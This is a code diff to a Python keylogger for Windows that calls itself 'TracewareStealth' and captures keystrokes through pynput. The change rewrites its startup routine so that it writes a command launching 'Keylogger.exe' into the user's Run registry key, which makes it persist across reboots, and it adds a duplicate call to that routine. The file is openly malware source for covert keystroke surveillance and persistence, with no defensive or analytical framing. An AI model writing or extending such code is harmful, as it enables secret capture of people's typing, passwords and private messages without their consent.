@@ -8,6 +8,7 @@ import win32process
 import win32api
 import threading
 import atexit
+import shutil
 import winreg as reg
 from datetime import datetime
 from pynput import keyboard
@@ -173,12 +174,17 @@ keystroke_thread.start()
 def add_to_startup():
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     value_name = "TracewareStealth"
-    script_path = os.path.abspath(__file__)
+    script_path = os.path.abspath(__file__)  # Get the absolute path of the current executable
+    command = f'"{script_path}" --processStart Keylogger.exe'  # Set the command with the argument
+
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
-            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, script_path)
+            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, command)  # Store the command in the registry
     except Exception as e:
         print(f"Failed to add to startup: {e}")
+
+# Call the function to add to startup
+add_to_startup()
 
 # Add to startup
 add_to_startup()
